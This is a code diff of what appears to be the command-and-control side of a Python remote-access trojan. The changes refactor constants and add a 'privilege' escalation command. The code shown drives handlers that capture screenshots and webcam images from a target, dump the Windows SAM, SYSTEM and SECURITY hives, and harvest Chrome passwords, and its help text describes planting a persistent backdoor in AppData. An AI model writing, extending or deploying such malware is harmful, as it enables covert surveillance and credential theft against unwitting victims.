@@ -9,12 +9,11 @@ import threading
 
 # Constants
 SCREENSHOT_DIR = 'images/screenshots'
-SCREENSHOT_CHUNK_SIZE = 10485760  # 10MB
-SCREENSHOT_TIMEOUT = 3
-
 WEBCAM_DIR = './images/webcam'
-WEBCAM_CHUNK_SIZE = 10485760  # 10MB
-WEBCAM_TIMEOUT = 10
+IMAGE_CHUNK_SIZE = 10485760 #10MB
+SCREENSHOT_TIMEOUT = 10 # seconds
+WEBCAM_TIMEOUT = 10 # seconds
+
 heartbeat_timeout = 10  # seconds
 
 ENCODING = 'utf-8'
@@ -62,6 +61,7 @@ class Bot:
                                                 copies backdoor to ~/AppData/Roaming/filename
                                                 example: persistence Backdoor windows32.exe
         check                               --> Check If Has Administrator Privileges
+        privilege                           --> Attempt to escalate privileges
 
 
         \n''')
@@ -70,7 +70,7 @@ class Bot:
         jsondata = json.dumps(data)
         while True:
             try:
-                self.target.send(jsondata.encode())
+                self.target.send(jsondata.encode(ENCODING))
                 break
             except BrokenPipeError:
                 break
@@ -82,7 +82,7 @@ class Bot:
         data = ''
         while True:
             try:
-                data += self.target.recv(1024).decode().rstrip()
+                data += self.target.recv(1024).decode(ENCODING).rstrip()
                 return json.loads(data)
             except ValueError:
                 continue
@@ -152,7 +152,7 @@ class Bot:
                 try:
                     if chunk is not None:
                         f.write(chunk)
-                    chunk = self.target.recv(SCREENSHOT_CHUNK_SIZE)
+                    chunk = self.target.recv(IMAGE_CHUNK_SIZE)
                 except socket.timeout:
                     break
         except socket.error as e:
@@ -179,7 +179,7 @@ class Bot:
                 try:
                     if chunk is not None:
                         f.write(chunk)
-                    chunk = self.target.recv(WEBCAM_CHUNK_SIZE)
+                    chunk = self.target.recv(IMAGE_CHUNK_SIZE)
                 except socket.timeout:
                     break
         except socket.error as e:
@@ -190,8 +190,8 @@ class Bot:
         print(f"Webcam image saved to {file_name}")
         return count + 1
 
-    def handle_sam_dump(self, command):
-        self.reliable_send(command)
+    def handle_sam_dump(self):
+        print("sam handle")
         sam_data, system_data, security_data = self.reliable_recv()
         if isinstance(sam_data, str):
             print(sam_data)
@@ -231,9 +231,9 @@ class Bot:
                 self.reliable_send(command)
                 self.webcam(webcam_count)
                 webcam_count += 1
-            elif command[:12] == 'get_sam_dump':
+            elif command[:8] == 'sam_dump':
                 self.reliable_send(command)
-                self.handle_sam_dump(command)
+                self.handle_sam_dump()
             elif command[:11] == "chrome_pass":
                 self.reliable_send(command)
                 result = self.reliable_recv()
